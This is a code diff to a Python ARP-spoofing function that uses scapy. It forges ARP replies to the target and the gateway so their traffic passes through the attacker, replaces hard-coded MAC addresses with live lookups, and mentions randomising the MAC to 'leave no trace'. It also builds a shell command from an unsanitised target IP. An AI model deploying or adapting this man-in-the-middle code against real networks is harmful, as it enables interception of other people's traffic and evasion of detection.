@@ -84,14 +84,12 @@ def arp_spoofing(target_ip, gateway_ip, interface):
     """ Send ARP packets to spoof an IP """    
     os.system(f"ping -c 1 {target_ip} > /dev/null")
     target_mac = get_mac(target_ip)
-    #gateway_mac = get_mac(gateway_ip)
-    gateway_mac = "88:de:7c:a6:45:d0"
-    #my_mac = random_mac()
-    #my_mac = scapy.get_if_hwaddr("eth0")
-    my_mac = "f4:96:34:95:df:3f"
-    #if target_mac is None or gateway_mac is None:
-    #    print("[!] Could not get the target or router MAC.")
-    #    return
+    gateway_mac = get_mac(gateway_ip)
+    #my_mac = random_mac()    # In case you want to leave no trace
+    my_mac = scapy.get_if_hwaddr(interface)
+    if target_mac is None or gateway_mac is None:
+        print("[!] Could not get the target or router MAC.")
+        return
     target_arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=my_mac)
     router_arp = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=my_mac)
     target_eth_frame = scapy.Ether(dst=target_mac, src=my_mac) / target_arp
